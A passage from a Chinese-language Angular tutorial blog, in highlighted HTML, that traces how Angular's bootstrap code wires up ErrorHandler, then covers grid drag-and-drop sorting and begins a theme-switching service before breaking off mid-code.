      moduleType<span class="token operator">:</span> Type<span class="token operator">&lt;</span><span class="token constant">M</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> compilerOptions<span class="token operator">:</span> <span class="token punctuation">(</span>CompilerOptions<span class="token operator">&amp;</span>BootstrapOptions<span class="token punctuation">)</span><span class="token operator">|</span>
      Array<span class="token operator">&lt;</span>CompilerOptions<span class="token operator">&amp;</span>BootstrapOptions<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>NgModuleRef<span class="token operator">&lt;</span><span class="token constant">M</span><span class="token operator">&gt;&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token function">optionsReducer</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> compilerOptions<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">compileNgModuleFactory</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>injector<span class="token punctuation">,</span> options<span class="token punctuation">,</span> moduleType<span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">moduleFactory</span> <span class="token operator">=&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">bootstrapModuleFactory</span><span class="token punctuation">(</span>moduleFactory<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>通过观察以上代码，我们发现在完成模块编译后，在 bootstrapModule() 方法内部会继续调用 bootstrapModuleFactory() 方法（源码片段）：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// packages/core/src/application_ref.ts</span>
bootstrapModuleFactory<span class="token operator">&lt;</span><span class="token constant">M</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>moduleFactory<span class="token operator">:</span> NgModuleFactory<span class="token operator">&lt;</span><span class="token constant">M</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> options<span class="token operator">?</span><span class="token operator">:</span> BootstrapOptions<span class="token punctuation">)</span><span class="token operator">:</span>
      Promise<span class="token operator">&lt;</span>NgModuleRef<span class="token operator">&lt;</span><span class="token constant">M</span><span class="token operator">&gt;&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> ngZoneOption <span class="token operator">=</span> options <span class="token operator">?</span> options<span class="token punctuation">.</span>ngZone <span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> ngZone <span class="token operator">=</span> <span class="token function">getNgZone</span><span class="token punctuation">(</span>ngZoneOption<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> providers<span class="token operator">:</span> StaticProvider<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>provide<span class="token operator">:</span> NgZone<span class="token punctuation">,</span> useValue<span class="token operator">:</span> ngZone<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> ngZone<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> ngZoneInjector <span class="token operator">=</span> Injector<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>
        <span class="token punctuation">{</span>  providers<span class="token operator">:</span> providers<span class="token punctuation">,</span> 
           parent<span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>injector<span class="token punctuation">,</span> 
           name<span class="token operator">:</span> moduleFactory<span class="token punctuation">.</span>moduleType<span class="token punctuation">.</span>name
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> moduleRef <span class="token operator">=</span> <span class="token operator">&lt;</span>InternalNgModuleRef<span class="token operator">&lt;</span><span class="token constant">M</span><span class="token operator">&gt;&gt;</span>moduleFactory<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>ngZoneInjector<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> exceptionHandler<span class="token operator">:</span> ErrorHandler <span class="token operator">=</span> moduleRef<span class="token punctuation">.</span>injector<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>ErrorHandler<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>exceptionHandler<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'No ErrorHandler. Is platform module (BrowserModule) included?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      moduleRef<span class="token punctuation">.</span><span class="token function">onDestroy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_modules<span class="token punctuation">,</span> moduleRef<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      ngZone <span class="token operator">!</span><span class="token punctuation">.</span><span class="token function">runOutsideAngular</span><span class="token punctuation">(</span>
          <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> ngZone <span class="token operator">!</span><span class="token punctuation">.</span>onError<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>
            <span class="token punctuation">{</span><span class="token function-variable function">next</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">error<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> 
               exceptionHandler<span class="token punctuation">.</span><span class="token function">handleError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>在 ngZone 对象的 run() 方法内部，我们先调用 Injector 的 create() 方法创建 ngZoneInjector 注入器，然后把它作为参数传给 moduleFactory 对象的 create() 方法，创建根模块对象。接着通过调用根级注入器的 get() 方法，获取 ErrorHandler 对象。</p> <p>在获取 ErrorHandler 对象之后，通过调用 ngZone !.runOutsideAngular() 方法，启用异常处理器：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>ngZone <span class="token operator">!</span><span class="token punctuation">.</span><span class="token function">runOutsideAngular</span><span class="token punctuation">(</span>
   <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> ngZone <span class="token operator">!</span><span class="token punctuation">.</span>onError<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>
     <span class="token punctuation">{</span><span class="token function-variable function">next</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">error<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> 
        exceptionHandler<span class="token punctuation">.</span><span class="token function">handleError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>因为 NgZone 类 onError 属性是一个 EventEmitter 对象：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">/**
 * Notifies that an error has been delivered.
 */</span>
readonly onError<span class="token operator">:</span> EventEmitter<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmitter</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>所以我们可以订阅该对象，然后执行我们异常处理逻辑：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>ngZone <span class="token operator">!</span><span class="token punctuation">.</span>onError<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>
  <span class="token punctuation">{</span> <span class="token function-variable function">next</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">error<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> 
        exceptionHandler<span class="token punctuation">.</span><span class="token function">handleError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>此外在 bootstrapModuleFactory() 方法内部，在完成应用初始化操作之后，内部还会进一步调用 _moduleDoBootstrap() 启动我们的根组件：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">return</span> <span class="token function">_callAndReportToErrorHandler</span><span class="token punctuation">(</span>exceptionHandler<span class="token punctuation">,</span> ngZone <span class="token operator">!</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
     <span class="token keyword">const</span> initStatus<span class="token operator">:</span> ApplicationInitStatus <span class="token operator">=</span> 
        moduleRef<span class="token punctuation">.</span>injector<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>ApplicationInitStatus<span class="token punctuation">)</span><span class="token punctuation">;</span>
        initStatus<span class="token punctuation">.</span><span class="token function">runInitializers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> initStatus<span class="token punctuation">.</span>donePromise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_moduleDoBootstrap</span><span class="token punctuation">(</span>moduleRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> moduleRef<span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>接下来我们继续看一下 _moduleDoBootstrap() 方法：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">private</span> <span class="token function">_moduleDoBootstrap</span><span class="token punctuation">(</span>moduleRef<span class="token operator">:</span> InternalNgModuleRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> appRef <span class="token operator">=</span> moduleRef<span class="token punctuation">.</span>injector<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>ApplicationRef<span class="token punctuation">)</span> <span class="token keyword">as</span> ApplicationRef<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>moduleRef<span class="token punctuation">.</span>_bootstrapComponents<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      moduleRef<span class="token punctuation">.</span>_bootstrapComponents<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">f</span> <span class="token operator">=&gt;</span> appRef<span class="token punctuation">.</span><span class="token function">bootstrap</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>moduleRef<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>ngDoBootstrap<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      moduleRef<span class="token punctuation">.</span>instance<span class="token punctuation">.</span><span class="token function">ngDoBootstrap</span><span class="token punctuation">(</span>appRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
          <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">The module </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">stringify</span><span class="token punctuation">(</span>moduleRef<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> was bootstrapped, but it does not declare &quot;@NgModule.bootstrap&quot; components nor a &quot;ngDoBootstrap&quot; method. </span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span>
          <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Please define one of these.</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_modules<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>moduleRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>上面代码提到了 ApplicationRef 类，该类内部也注入了 ErrorHandler 对象。不过这里我们不会详细展开，主要看一下跟 ErrorHandler 对象相关的处理逻辑：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// packages/core/src/application_ref.ts</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ApplicationRef</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span>
      <span class="token parameter"><span class="token keyword">private</span> _zone<span class="token operator">:</span> NgZone<span class="token punctuation">,</span> 
      <span class="token keyword">private</span> _console<span class="token operator">:</span> Console<span class="token punctuation">,</span> 
      <span class="token keyword">private</span> _injector<span class="token operator">:</span> Injector<span class="token punctuation">,</span>
      <span class="token keyword">private</span> _exceptionHandler<span class="token operator">:</span> ErrorHandler<span class="token punctuation">,</span>
      <span class="token keyword">private</span> _componentFactoryResolver<span class="token operator">:</span> ComponentFactoryResolver<span class="token punctuation">,</span>
      <span class="token keyword">private</span> _initStatus<span class="token operator">:</span> ApplicationInitStatus</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>_zone<span class="token punctuation">.</span>onMicrotaskEmpty<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>
          <span class="token punctuation">{</span><span class="token function-variable function">next</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_zone<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">tick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>在 ApplicationRef 构造函数内部，会订阅 NgZone 对象的 onMicrotaskEmpty 属性，即当微任务执行完成后，会调用内部 tick 方法执行变化检测，在变化检测周期如果发生异常时，就会调用我们自定义的异常处理器的 handleError 方法执行相应的异常处理逻辑：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">tick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_runningTick<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'ApplicationRef.tick is called recursively'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> scope <span class="token operator">=</span> ApplicationRef<span class="token punctuation">.</span><span class="token function">_tickScope</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_runningTick <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_views<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">view</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> view<span class="token punctuation">.</span><span class="token function">detectChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_enforceNoNewChanges<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>_views<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">view</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> view<span class="token punctuation">.</span><span class="token function">checkNoChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// Attention: Don't rethrow as it could cancel subscriptions to Observables!</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_zone<span class="token punctuation">.</span><span class="token function">runOutsideAngular</span><span class="token punctuation">(</span>
          <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_exceptionHandler<span class="token punctuation">.</span><span class="token function">handleError</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_runningTick <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token function">wtfLeave</span><span class="token punctuation">(</span>scope<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h2 id="网格拖拽"><a href="#网格拖拽" class="header-anchor">#</a> 网格拖拽</h2> <p>如果你只是需要实现单方向水平或垂直拖拽排序那么cdk的drag-drop可以很方便实现，如果你想实现网格化双向拖拽排序，那么需要一些技巧，下面分两种效果说明。</p> <p>实例一效果（实时联动）：</p> <p><img src="/vuebloger/img/post/drag1.gif" alt=""></p> <p>实例二效果（松开鼠标后再产生替换）：</p> <p><img src="/vuebloger/img/post/drag2.gif" alt=""></p> <p>上面说的实时预览的效果区别，而你其实可以每种效果下按照你的需要选择拖拽排序的两个元素是互相交换位置还是把一个元素插入另外一个元素的基于拖拽方向的前面。下面是我在项目中得运用：</p> <p><img src="/vuebloger/img/post/drag.gif" alt=""></p> <p><img src="/vuebloger/img/post/drag3.gif" alt=""></p> <p>值得一提的是，拖拽指令的应用往往需要特定的dom结构。事实上，我们实际项目中通常会遇到层级不符合要求的情况，比如上述你用了第三方ui如zorro的菜单栏控件他们会自动生成有一定的层级结构，这个时候上述两个例子的技巧就会起到很好的借鉴作用。</p> <p>效果一的实现可以参看<a href="https://stackblitz.com/edit/angular-3h5tgg?file=src%2Fapp%2Fapp.component.html" target="_blank" rel="noopener noreferrer">stackblitz示例一<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>,本质是使用droplist实现双方向的方向检测。</p> <p>效果二得实现可以参看<a href="https://stackblitz.com/edit/angular-dragdrop-grid-pnyded?file=src%2Fapp%2Fapp.component.ts" target="_blank" rel="noopener noreferrer">stackblitz示例二<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>,内部逻辑原理较难解释清楚，依葫芦画瓢即可。</p> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>上述课程建设学习资料例子即使上传很大的图片其预览图也会很流畅显示出来，如果你也想控制很大的图片预览图也可以快速显示不卡顿，可以利用<a href="/vuebloger/technology/开启history模式全解.html#oss指定大小图片">oss图片裁切</a>的功能实现极佳的用户体验</p></div> <h2 id="换肤方案"><a href="#换肤方案" class="header-anchor">#</a> 换肤方案</h2> <p>angular换肤方案得实现可以分为两个部分：1.自定义结构一键换肤2. 第三方ui一键换肤。</p> <h3 id="自定义结构一键换肤"><a href="#自定义结构一键换肤" class="header-anchor">#</a> 自定义结构一键换肤</h3> <p>前端换肤最大得工作是样式和图片得切换，所以可以产生这样的思路：</p> <ol><li>创建服务，定义差异化换肤变量；定义根据不同条件获取不同的样式，图片路径的方法；</li> <li>使用服务，创建样式指令，图片指令</li> <li>到需要换肤的自定义结构埋入指令</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// style.service.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Injectable<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ToolsUtil<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;../utils/tools.util&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">enum</span> ThemeType <span class="token punctuation">{</span>
  normal <span class="token operator">=</span> <span class="token string">'normal'</span><span class="token punctuation">,</span>
  educational <span class="token operator">=</span> <span class="token string">'educational'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> themeManager <span class="token operator">=</span> <span class="token punctuation">{</span>
  cjsd<span class="token operator">:</span> ThemeType<span class="token punctuation">.</span>normal<span class="token punctuation">,</span>
  zksd<span class="token operator">:</span> ThemeType<span class="token punctuation">.</span>educational
<span class="token punctuation">}</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> <span class="token string">'root'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">StyleService</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> styleType<span class="token operator">:</span> string <span class="token operator">=</span> themeManager<span class="token punctuation">[</span>ToolsUtil<span class="token punctuation">.</span><span class="token function">getOrgCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token string">'normal'</span><span class="token punctuation">;</span> <span class="token comment">// 👈 总入口，根据不同条件选择不同的主题</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token function">getImgUrl</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> imgUrl <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">url(assets/images/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>styleType <span class="token operator">===</span> <span class="token string">&quot;normal&quot;</span> <span class="token operator">?</span> <span class="token string">&quot;&quot;</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>styleType <span class="token operator">+</span> <span class="token string">&quot;/&quot;</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.png)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span> 
    <span class="token keyword">return</span> imgUrl<span class="token punctuation">;</span> <span class="token comment">// 👈 每个主题对应一个文件夹放图片，不同条件选择不同的主题到对应主题文件夹拿图片</span>
  <span class="token punctuation">}</span>
  <span class="token function">getStyle</span><span class="token punctuation">(</span><span class="token parameter">code<span class="token operator">:</span> Array<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
